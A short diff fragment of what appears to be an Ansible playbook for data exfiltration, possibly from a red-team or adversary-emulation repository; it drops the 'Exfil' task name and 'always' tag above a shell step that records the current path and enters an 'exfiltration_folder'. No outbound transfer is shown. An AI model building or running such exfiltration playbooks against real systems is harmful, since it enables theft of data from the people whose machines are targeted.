@@ -22,8 +22,6 @@
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files_list
      
-    - name: Exfil
-      tags: always
       shell: |
         pwd > /tmp/path
         cd {{ exfiltration_folder }}
